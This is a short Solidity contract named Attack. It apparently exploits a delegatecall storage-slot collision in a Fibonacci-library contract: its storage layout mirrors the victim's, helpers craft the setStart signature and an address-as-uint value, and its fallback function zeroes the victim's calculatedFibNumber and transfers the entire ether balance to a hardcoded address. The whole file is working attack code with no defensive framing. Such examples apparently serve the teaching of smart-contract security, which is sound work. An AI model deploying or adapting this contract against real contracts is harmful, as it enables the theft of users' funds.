pragma solidity ^0.4.8;

contract Attack {
    uint storageSlot0; // corresponds to fibonacciLibrary
    uint storageSlot1; // corresponds to calculatedFibNumber

    function addressToUint(address _address) public returns (uint) {
        return uint(_address);
    }

    function generateSetStartSig() public returns (bytes4) {
        return bytes4(sha3("setStart(uint256)"));
    }
    
    // fallback - this will run if a specified function is not found
    function() public {
        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
        // is called we don't send out any ether
        0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.transfer(this.balance); // we take all the ether
    }
}
